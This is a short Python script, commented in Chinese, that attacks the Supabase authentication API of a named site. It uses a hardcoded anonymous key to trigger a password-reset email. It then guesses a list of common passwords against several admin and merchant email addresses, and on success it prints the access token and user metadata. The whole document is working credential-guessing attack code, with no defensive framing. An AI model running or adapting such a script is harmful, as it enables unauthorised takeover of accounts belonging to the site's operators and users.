import urllib.request, json, sys

# 试试找密码 — 用 supabase auth 相关 API
ANON = "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFub24iLCAiaXNzIjogInN1cGFiYXNlIiwgImlhdCI6IDE3OTAyNjgwMTYsICJleHAiOiAyMTA1NjI4MDE2fQ.P3s0YUizo985KezDkYZLOSbJGB0_2EaEzLd23MGSsFw"
BASE = "https://thalvior.icu"

# 1. 试试 reset password 流程（send reset email）
# POST /auth/v1/recover
body = json.dumps({"email": "wms@thalvior.dev"}).encode()
req = urllib.request.Request(f"{BASE}/auth/v1/recover", data=body, method="POST")
req.add_header("apikey", ANON)
req.add_header("Authorization", f"Bearer {ANON}")
req.add_header("Content-Type", "application/json")
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        print("reset email:", r.status, r.read().decode())
except urllib.error.HTTPError as e:
    print(f"reset email HTTP {e.code}:", e.read().decode()[:200])

# 2. 试试 signInWithPassword via REST
for email in ["wms@thalvior.dev", "wms@thalvior.icu", "merchant@thalvior.dev", "admin@thalvior.dev"]:
    for pwd in ["Wms@2024!", "Wms123456!", "wms@2024", "Wms@123", "Wms@2025", "Thalvior@2024", "Thalvior@2025", "admin@123", "Admin@2024", "Admin@2025"]:
        try:
            body2 = json.dumps({"email": email, "password": pwd}).encode()
            req2 = urllib.request.Request(f"{BASE}/auth/v1/token?grant_type=password", data=body2, method="POST")
            req2.add_header("apikey", ANON)
            req2.add_header("Authorization", f"Bearer {ANON}")
            req2.add_header("Content-Type", "application/json")
            with urllib.request.urlopen(req2, timeout=8) as r2:
                data = json.loads(r2.read().decode())
                if "access_token" in data:
                    print(f"\n🎯 SUCCESS! email={email}, pwd={pwd}")
                    print(f"   access_token: {data['access_token'][:30]}...")
                    print(f"   user: {data.get('user',{}).get('email')}")
                    print(f"   meta: {data.get('user',{}).get('user_metadata')}")
                    sys.exit(0)
        except urllib.error.HTTPError:
            pass

print("All password combos failed")
